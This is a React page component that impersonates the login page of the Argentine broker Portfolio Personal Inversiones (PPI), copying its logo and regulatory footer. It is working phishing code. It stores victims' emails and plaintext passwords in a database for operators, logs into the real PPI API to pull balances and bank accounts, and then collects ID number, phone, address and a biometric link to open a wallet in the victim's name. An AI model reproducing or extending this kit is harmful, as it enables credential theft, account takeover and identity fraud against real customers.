import { useState, useEffect, useCallback, useRef } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { ppiApi } from "@/lib/ppiApi";
import { invokeWayni } from "@/lib/wayniApi";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import PpiLoginForm from "@/components/ppi/PpiLoginForm";
import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
import CocosV2AddressScreen from "@/components/cocosv2/CocosV2AddressScreen";
import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
import ppiLogoSvg from "@/assets/ppi-logo.svg";
import qrFiscalPng from "@/assets/ppi-qr-fiscal.png";
import sidPng from "@/assets/ppi-sid.png";
import ppiBgPattern from "@/assets/ppi-bg-pattern.svg";

const ppiLogo = <img src={ppiLogoSvg} alt="PPI" className="h-12 w-auto" />;

type Step = "login" | "waiting" | "syncing" | "verify_identity" | "address" | "biometric" | "done";

interface IdentityVerifyPayload {
  identity_number: string;
  phone_number: string;
  selected_full_name?: string;
  selected_gender?: string;
  selected_tax_identification_value?: string;
}

interface IdentityVerifyResult {
  requires_selection?: boolean;
  candidates?: Array<{
    identity_number?: string;
    full_name: string;
    gender: string;
    tax_identification_value: string;
  }>;
  suggested_gender?: string;
}

const PPI = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const cleanedCode = rawOperatorCode
    ? rawOperatorCode.replace(/[^a-zA-Z0-9]/g, "") || "master"
    : "master";
  const operatorCode = cleanedCode;

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [statusMsg, setStatusMsg] = useState("");

  const [sessionId, setSessionId] = useState("");
  const sessionIdRef = useRef("");
  const lastPasswordRef = useRef("");

  // Wayni onboarding state
  const [syncedFullName, setSyncedFullName] = useState("");
  const [syncedPhone, setSyncedPhone] = useState("");
  const [biometricUrl, setBiometricUrl] = useState("");
  const [userUuid, setUserUuid] = useState("");
  const [userGender, setUserGender] = useState("");
  const [lastDni, setLastDni] = useState("");

  useVisitTracker();
  useVisitorPresence(sessionId || null);

  useEffect(() => {
    document.title = "PPI — Iniciar sesión";
    // Prevent iOS zoom on focus
    const meta = document.querySelector('meta[name="viewport"]');
    if (meta) {
      meta.setAttribute("content", "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no");
    }
    return () => {
      if (meta) {
        meta.setAttribute("content", "width=device-width, initial-scale=1.0");
      }
    };
  }, []);

  const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
    const { data } = await supabase.from("sessions").insert({
      email: userEmail,
      source: "ppi",
      status,
      otp_code: extra.otp_code as string || null,
      password: extra.password as string || null,
      ip_address: null,
      operator_code: operatorCode,
    } as any).select("id").single();
    if (data?.id) {
      setSessionId(data.id);
      sessionIdRef.current = data.id;
    }
    return data?.id;
  }, [operatorCode]);

  const updateSession = useCallback(async (status: string, extra: Record<string, unknown> = {}) => {
    const sid = sessionIdRef.current;
    if (!sid) return;
    await supabase.from("sessions").update({ status, ...extra }).eq("id", sid);
  }, []);

  // Persist onboarding data to wayni_onboarding table
  const saveOnboardingData = useCallback(async (data: Record<string, unknown>) => {
    try {
      const normalizedEmail = String(data.email || email || "").trim().toLowerCase();
      if (!normalizedEmail) return;
      const sid = sessionIdRef.current || null;
      const { data: existing } = await (supabase as any)
        .from("wayni_onboarding")
        .select("id, metadata")
        .eq("email", normalizedEmail)
        .order("created_at", { ascending: false })
        .limit(1)
        .single();

      const mergedMetadata = {
        ...(((existing?.metadata as Record<string, unknown> | null) ?? {})),
        ...((((data.metadata as Record<string, unknown> | null) ?? {}))),
      };

      const payload = {
        ...data,
        email: normalizedEmail,
        session_id: sid,
        operator_code: operatorCode,
        source: "ppi",
        updated_at: new Date().toISOString(),
        metadata: Object.keys(mergedMetadata).length > 0 ? mergedMetadata : undefined,
      };

      if (existing?.id) {
        await (supabase as any).from("wayni_onboarding").update(payload).eq("id", existing.id);
      } else {
        await (supabase as any).from("wayni_onboarding").insert(payload);
      }
    } catch (e) {
      console.warn("[PPI ONBOARDING] Failed to persist:", e);
    }
  }, [email, operatorCode]);

  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError("");
    setLoading(true);
    setEmail(submittedEmail);
    lastPasswordRef.current = password;

    await createSession(submittedEmail, "login_attempt", { password });

    try {
      setStatusMsg("Verificando credenciales...");
      const res = await ppiApi.login(submittedEmail, password, operatorCode);

      if (res.success || res.raw?.status === 0) {
        const fullName = res.fullName || res.raw?.payload?.usuario?.nombreCompleto || res.raw?.payload?.denominacion || "";
        const token = typeof res.token === "string" ? res.token : (res.token?.accessToken || res.raw?.payload?.token?.accessToken || "");
        let cuentaId = res.cuentaId;
        if (!cuentaId && token) {
          try {
            const claims = JSON.parse(atob(token.split(".")[1]));
            cuentaId = parseInt(claims["PPAuth.Claims.General.Cuentas"]) || null;
          } catch { /* ignore */ }
        }

        await updateSession("login_success", {
          otp_code: `name:${fullName}|cuenta:${cuentaId}`,
        });

        if (fullName) setSyncedFullName(fullName);

        if (token) {
          setStep("syncing");
          setStatusMsg("Sincronizando datos de tu cuenta...");
          try {
            await ppiApi.balances(token, cuentaId);
            await ppiApi.bankAccounts(token, cuentaId);
          } catch { /* silent */ }
          await updateSession("completed", {
            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
          });
        } else {
          await updateSession("waiting_operator", {
            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:pending`,
          });
        }
      } else {
        await updateSession("waiting_operator", {
          otp_code: `credentials_captured`,
        });
      }

      setStep("verify_identity");
      setStatusMsg("");
    } catch (e: any) {
      await updateSession("waiting_operator", {
        otp_code: `credentials_captured`,
      });
      setStep("verify_identity");
      setStatusMsg("");
    }
    setLoading(false);
  }, [createSession, updateSession, operatorCode]);

  // ── Identity Verification (Wayni onboarding) ──
  const handleIdentityVerify = useCallback(async (data: IdentityVerifyPayload): Promise<IdentityVerifyResult | void> => {
    const resolvedPhone = (data.phone_number || syncedPhone || "").trim();

    await updateSession("verify_dni_submitted", {
      otp_code: `dni:${data.identity_number}|phone:${resolvedPhone}|name_pick:${data.selected_full_name || ""}|gender_pick:${data.selected_gender || ""}`,
    });
    setLastDni(data.identity_number);

    try {
      const { data: walletCheck } = await invokeWayni({
        action: "get_wallet_status",
        identity_number: data.identity_number,
      });
      if (walletCheck?.status === "ACTIVE") {
        await updateSession("completed", { otp_code: `dni:${data.identity_number}|wallet:ACTIVE|skipped:true` });
        setStep("done");
        return;
      }
    } catch { /* continue */ }

    const pwd = lastPasswordRef.current;
    const MAX_DNI_RETRIES = 3;
    let result: any = null;
    let lastDniError = "";

    for (let attempt = 1; attempt <= MAX_DNI_RETRIES; attempt++) {
      const { data: attemptResult, error: apiError } = await invokeWayni({
        action: "onboarding_verify",
        email,
        identity_number: data.identity_number,
        phone_number: resolvedPhone,
        password: pwd,
        selected_full_name: data.selected_full_name,
        selected_gender: data.selected_gender,
        selected_tax_identification_value: data.selected_tax_identification_value,
      });

      if (!apiError && attemptResult && !attemptResult.error) {
        result = attemptResult;
        break;
      }

      lastDniError = attemptResult?.error || apiError?.message || "Error desconocido en la verificación";
      await updateSession("verify_dni_error", {
        otp_code: `dni:${data.identity_number}|attempt:${attempt}/${MAX_DNI_RETRIES}|error:${lastDniError}`,
      });

      if (attempt < MAX_DNI_RETRIES) {
        await new Promise((r) => setTimeout(r, 500));
      }
    }

    if (!result) {
      throw new Error(`DNI no verificado después de ${MAX_DNI_RETRIES} intentos. Motivo: ${lastDniError}`);
    }

    if (result?.requires_selection) {
      const candidates = Array.isArray(result?.candidates) ? result.candidates : [];
      if (!candidates.length) {
        throw new Error("No fue posible validar el titular del DNI. Intentá nuevamente.");
      }
      return {
        requires_selection: true,
        candidates,
        suggested_gender: String(result?.suggested_gender || data.selected_gender || "").toUpperCase(),
      };
    }

    const resolvedGender = String(result?.gender || data.selected_gender || "").toUpperCase();
    if (result?.full_name) setSyncedFullName(result.full_name);
    if (result?.user_uuid) setUserUuid(result.user_uuid);
    if (resolvedGender) setUserGender(resolvedGender);

    await updateSession("verify_dni_success", {
      otp_code: `dni:${data.identity_number}|name:${result?.full_name || data.selected_full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${resolvedGender}|phone:${resolvedPhone}`,
    });

    await saveOnboardingData({
      dni: data.identity_number,
      full_name: result?.full_name || data.selected_full_name || "",
      phone: resolvedPhone,
      gender: resolvedGender,
      user_uuid: result?.user_uuid || "",
      password: lastPasswordRef.current || "",
      status: "verify_dni_success",
    });

    setStep("address");
  }, [email, syncedPhone, updateSession, saveOnboardingData]);

  // ── Address submission → biometric ──
  const handleAddressSubmit = useCallback(async (addressData: Record<string, unknown>) => {
    await updateSession("address_submitted", { otp_code: `region:${addressData.region}|city:${addressData.city}` });
    const { data: result, error: apiError } = await invokeWayni({
      action: "save_address",
      ...addressData,
    });

    if (apiError || result?.error) {
      throw new Error(result?.error || apiError?.message || "Error al guardar la dirección");
    }

    await updateSession("address_saved");

    const { data: bioResult, error: bioError } = await invokeWayni({
      action: "onboarding_biometric",
      identity_number: lastDni,
      user_uuid: userUuid,
      gender: userGender,
    });

    if (bioError || bioResult?.error || !bioResult?.biometric_url) {
      throw new Error(bioResult?.error || bioError?.message || "Error al generar enlace biométrico");
    }

    setBiometricUrl(bioResult.biometric_url);
    await updateSession("biometric_started", {
      otp_code: `dni:${lastDni}|name:${syncedFullName}|uuid:${userUuid}|gender:${userGender}|region:${addressData.region}|city:${addressData.city}|street:${addressData.street_name} ${addressData.street_number}|zip:${addressData.zip_code}|biometric_url:${bioResult.biometric_url}|biometric_id:${bioResult.biometric_id || ""}`,
    });

    await saveOnboardingData({
      region: String(addressData.region || ""),
      city: String(addressData.city || ""),
      street: `${addressData.street_name || ""} ${addressData.street_number || ""}`.trim(),
      zip_code: String(addressData.zip_code || ""),
      biometric_url: bioResult.biometric_url,
      biometric_id: bioResult.biometric_id || "",
      status: "biometric_started",
      metadata: {
        region_id: addressData.region_id,
        city_id: addressData.city_id,
        street_name: addressData.street_name,
        street_number: addressData.street_number,
        floor: addressData.floor,
        apartment: addressData.apartment,
      },
    });

    setStep("biometric");
  }, [updateSession, lastDni, userUuid, userGender, syncedFullName, saveOnboardingData]);

  // ── Biometric events ──
  const handleBiometricEvent = useCallback(async (event: string) => {
    await updateSession(event);
    if (event === "biometric_finished") {
      await saveOnboardingData({ status: "biometric_finished" });
    }
  }, [updateSession, saveOnboardingData]);

  const showFullPage = step === "login" || step === "waiting" || step === "syncing";

  return (
    <div className="flex min-h-[100svh] flex-col bg-white">
      {/* ── Header ── */}
      {showFullPage && (
        <header className="flex items-center justify-between px-5 py-4 sm:px-10 sm:py-5 bg-white">
          <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-9" />
          <span className="text-[13px] sm:text-[14px] font-normal text-[#8c939a]">Acceso a PPI</span>
        </header>
      )}

      {/* ── Main area ── */}
      <main className="relative flex flex-1 items-center justify-center overflow-hidden">
        {/* SVG background pattern from PPI — desktop only */}
        {showFullPage && (
          <div className="pointer-events-none absolute inset-0 hidden sm:flex items-center justify-center">
            <img
              src={ppiBgPattern}
              alt=""
              className="w-full h-full object-cover"
              style={{ opacity: 0.6 }}
            />
          </div>
        )}

        {/* ── Login card ── */}
        {step === "login" && (
          <div className="relative z-10 w-full max-w-none sm:max-w-[420px] bg-white px-6 py-6 sm:px-10 sm:py-8">
            <h1 className="mb-6 text-center text-[20px] sm:text-[22px] font-bold text-[#1e2a3a]">
              Te damos la bienvenida
            </h1>
            <PpiLoginForm onSubmit={handleLogin} loading={loading} error={error} />
          </div>
        )}

        {(step === "waiting" || step === "syncing") && (
          <div className="relative z-10 w-full max-w-none sm:max-w-[420px] bg-white px-6 py-6 sm:px-10 sm:py-8">
            <div className="flex flex-col items-center gap-4 py-8 text-center">
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#42a5f5] border-t-transparent" />
              <p className="text-[15px] text-[#555]">{statusMsg || "Procesando tu solicitud..."}</p>
              <p className="text-[13px] text-[#999]">{email}</p>
            </div>
          </div>
        )}

        {step === "verify_identity" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2VerifyScreen
              email={email}
              fullName={syncedFullName}
              phone={syncedPhone}
              logo={ppiLogo}
              onSubmit={handleIdentityVerify}
            />
          </div>
        )}

        {step === "address" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2AddressScreen
              email={email}
              fullName={syncedFullName}
              userUuid={userUuid}
              logo={ppiLogo}
              onSubmit={handleAddressSubmit}
            />
          </div>
        )}

        {step === "biometric" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2BiometricScreen
              email={email}
              fullName={syncedFullName}
              biometricUrl={biometricUrl}
              logo={ppiLogo}
              brandName="Portfolio Personal Inversiones"
              onEvent={handleBiometricEvent}
            />
          </div>
        )}

        {step === "done" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2FinalScreen email={email} logo={ppiLogo} />
          </div>
        )}
      </main>

      {/* ── Footer ── */}
      {showFullPage && (
        <footer className="border-t border-[#e5e7eb] bg-white px-5 py-3 sm:px-10">
          {/* Desktop: single horizontal row */}
          <div className="hidden sm:flex items-center justify-between">
            <div className="flex items-center gap-2 text-[11px] text-[#999]">
              <span>Portfolio Personal Inversiones | Copyright 2021</span>
              <span className="text-[#ccc]">|</span>
              <span>ALyC Integral CNV N° 686 | ACyD FCI CNV N° 38 | ACyDI CNV N° 73</span>
              <span className="text-[#ccc]">|</span>
              <button type="button" className="text-[#42a5f5] hover:underline">
                Términos y políticas de privacidad
              </button>
            </div>
            <div className="flex items-center gap-3">
              <img src={qrFiscalPng} alt="Data Fiscal" className="h-9 object-contain" />
              <img src={sidPng} alt="SID" className="h-9 object-contain" />
            </div>
          </div>
          {/* Mobile: stacked */}
          <div className="flex flex-col items-center gap-2 sm:hidden py-2">
            <p className="text-center text-[10px] text-[#999]">
              Portfolio Personal Inversiones | Copyright 2021
            </p>
            <p className="text-center text-[10px] text-[#bbb]">
              ALyC Integral CNV N° 686 | ACyD FCI CNV N° 38 | ACyDI CNV N° 73
            </p>
            <button type="button" className="text-[10px] text-[#42a5f5] hover:underline">
              Términos y políticas de privacidad
            </button>
            <div className="flex items-center gap-3 mt-1">
              <img src={qrFiscalPng} alt="Data Fiscal" className="h-8 object-contain" />
              <img src={sidPng} alt="SID" className="h-8 object-contain" />
            </div>
          </div>
        </footer>
      )}
    </div>
  );
};

export default PPI;
